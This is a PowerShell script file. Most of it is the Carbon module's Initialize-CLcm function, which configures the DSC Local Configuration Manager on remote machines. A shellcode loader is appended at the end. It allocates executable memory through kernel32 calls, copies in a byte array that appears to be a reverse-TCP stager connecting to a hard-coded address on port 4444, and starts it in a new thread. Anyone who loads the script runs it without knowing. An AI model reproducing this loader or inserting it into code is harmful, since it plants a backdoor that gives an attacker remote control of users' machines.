











function Initialize-CLcm
{
    
    [CmdletBinding(SupportsShouldProcess=$true)]
    param(
        [Parameter(Mandatory=$true,ParameterSetName='Push')]
        [Switch]
        
        $Push,

        [Parameter(Mandatory=$true,ParameterSetName='PullWebDownloadManager')]
        [string]
        
        $ServerUrl,

        [Parameter(ParameterSetName='PullWebDownloadManager')]
        [Switch]
        
        $AllowUnsecureConnection,

        [Parameter(Mandatory=$true,ParameterSetName='PullFileDownloadManager')]
        [string]
        
        $SourcePath,

        [Parameter(Mandatory=$true,ParameterSetName='PullWebDownloadManager')]
        [Parameter(Mandatory=$true,ParameterSetName='PullFileDownloadManager')]
        [Guid]
        
        $ConfigurationID,

        [Parameter(Mandatory=$true,ParameterSetName='PullWebDownloadManager')]
        [Parameter(Mandatory=$true,ParameterSetName='PullFileDownloadManager')]
        [ValidateSet('ApplyOnly','ApplyAndMonitor','ApplyAndAutoCorrect')]
        [string]
        
        $ConfigurationMode,

        [Parameter(Mandatory=$true)]
        [string[]]
        
        $ComputerName,

        [PSCredential]
        
        $Credential,

        [Parameter(ParameterSetName='PullWebDownloadManager')]
        [Parameter(ParameterSetName='PullFileDownloadManager')]
        [Switch]
        
        $AllowModuleOverwrite,

        [Alias('Thumbprint')]
        [string]
        
        $CertificateID = $null,

        [string]
        
        $CertFile,

        [object]
        
        $CertPassword,

        [Alias('RebootNodeIfNeeded')]
        [Switch]
        
        $RebootIfNeeded,

        [Parameter(ParameterSetName='PullWebDownloadManager')]
        [Parameter(ParameterSetName='PullFileDownloadManager')]
        [ValidateRange(30,[Int32]::MaxValue)]
        [Alias('RefreshFrequencyMinutes')]
        [int]
        
        $RefreshIntervalMinutes = 30,

        [Parameter(ParameterSetName='PullWebDownloadManager')]
        [Parameter(ParameterSetName='PullFileDownloadManager')]
        [ValidateRange(1,([int]([Int32]::MaxValue)))]
        [int]
        
        $ConfigurationFrequency = 1,

        [Parameter(ParameterSetName='PullWebDownloadManager')]
        [Parameter(ParameterSetName='PullFileDownloadManager')]
        [PSCredential]
        
        $LcmCredential
    )

    Set-StrictMode -Version 'Latest'
    Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState

    if( $PSCmdlet.ParameterSetName -match '^Pull(File|Web)DownloadManager' )
    {
        if( [Environment]::OSVersion.Version.Major -ge 10 )
        {
            Write-Error -Message ('Initialize-CLcm can''t configure the local configuration manager to use the file or web download manager on Windows Server 2016 or later.')
            return
        }
    }

    if( $CertPassword -and $CertPassword -isnot [securestring] )
    {
        Write-Warning -Message ('You passed a plain text password to `Initialize-CLcm`. A future version of Carbon will remove support for plain-text passwords. Please pass a `SecureString` instead.')
        $CertPassword = ConvertTo-SecureString -String $CertPassword -AsPlainText -Force
    }
    
    $thumbprint = $null
    if( $CertificateID )
    {
        $thumbprint = $CertificateID
    }

    $privateKey = $null
    if( $CertFile )
    {
        $CertFile = Resolve-CFullPath -Path $CertFile
        if( -not (Test-Path -Path $CertFile -PathType Leaf) )
        {
            Write-Error ('Certificate file ''{0}'' not found.' -f $CertFile)
            return
        }

        $privateKey = Get-CCertificate -Path $CertFile -Password $CertPassword
        if( -not $privateKey )
        {
            return
        }

        if( -not $privateKey.HasPrivateKey )
        {
            Write-Error ('Certificate file ''{0}'' does not have a private key.' -f $CertFile)
            return
        }
        $thumbprint = $privateKey.Thumbprint
    }
    
    $credentialParam = @{ }
    if( $Credential )
    {
        $credentialParam.Credential = $Credential
    }

    $ComputerName = $ComputerName | 
                        Where-Object { 
                            if( Test-Connection -ComputerName $_ -Quiet ) 
                            {
                                return $true
                            }
                            
                            Write-Error ('Computer ''{0}'' not found or is unreachable.' -f $_)
                            return $false
                        }
    if( -not $ComputerName )
    {
        return
    }

    
    if( $privateKey )
    {
        $session = New-PSSession -ComputerName $ComputerName @credentialParam
        if( -not $session )
        {
            return
        }

        try
        {
            Install-CCertificate -Session $session `
                                -Path $CertFile `
                                -Password $CertPassword `
                                -StoreLocation ([Security.Cryptography.X509Certificates.StoreLocation]::LocalMachine) `
                                -StoreName ([Security.Cryptography.X509Certificates.StoreName]::My) | 
                Out-Null
        }
        finally
        {
            Remove-PSSession -Session $session -WhatIf:$false
        }
    }

    $sessions = New-CimSession -ComputerName $ComputerName @credentialParam

    try
    {
        $originalWhatIf = $WhatIfPreference
        $WhatIfPreference = $false
        configuration Lcm 
        {
            Set-StrictMode -Off

            $configID = $null
            if( $ConfigurationID )
            {
                $configID = $ConfigurationID.ToString()
            }

            node $AllNodes.NodeName
            {
                if( $Node.RefreshMode -eq 'Push' )
                {
                    LocalConfigurationManager
                    {
                        CertificateID = $thumbprint;
                        RebootNodeIfNeeded = $RebootIfNeeded;
                        RefreshMode = 'Push';
                    }
                }
                else
                {
                    if( $Node.RefreshMode -like '*FileDownloadManager' )
                    {
                        $downloadManagerName = 'DscFileDownloadManager'
                        $customData = @{ SourcePath = $SourcePath }
                    }
                    else
                    {
                        $downloadManagerName = 'WebDownloadManager'
                        $customData = @{
                                            ServerUrl = $ServerUrl;
                                            AllowUnsecureConnection = $AllowUnsecureConnection.ToString();
                                      }
                    }

                    LocalConfigurationManager
                    {
                        AllowModuleOverwrite = $AllowModuleOverwrite;
                        CertificateID = $thumbprint;
                        ConfigurationID = $configID;
                        ConfigurationMode = $ConfigurationMode;
                        ConfigurationModeFrequencyMins = $RefreshIntervalMinutes * $ConfigurationFrequency;
                        Credential = $LcmCredential;
                        DownloadManagerCustomData = $customData;
                        DownloadManagerName = $downloadManagerName;
                        RebootNodeIfNeeded = $RebootIfNeeded;
                        RefreshFrequencyMins = $RefreshIntervalMinutes;
                        RefreshMode = 'Pull'
                    }
                }
            }
        }

        $WhatIfPreference = $originalWhatIf

        $tempDir = New-CTempDirectory -Prefix 'Carbon+Initialize-CLcm+' -WhatIf:$false

        try
        {
            [object[]]$allNodes = $ComputerName | ForEach-Object { @{ NodeName = $_; PSDscAllowPlainTextPassword = $true; RefreshMode = $PSCmdlet.ParameterSetName } }
            $configData = @{
                AllNodes = $allNodes
            }

            $whatIfParam = @{ }
            if( (Get-Command -Name 'Lcm').Parameters.ContainsKey('WhatIf') )
            {
                $whatIfParam['WhatIf'] = $false
            }

            & Lcm -OutputPath $tempDir @whatIfParam -ConfigurationData $configData | Out-Null

            Set-DscLocalConfigurationManager -ComputerName $ComputerName -Path $tempDir @credentialParam

            Get-DscLocalConfigurationManager -CimSession $sessions
        }
        finally
        {
            Remove-Item -Path $tempDir -Recurse -WhatIf:$false
        }
    }
    finally
    {
        Remove-CimSession -CimSession $sessions -WhatIf:$false
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xb3,0xd6,0x9b,0x50,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

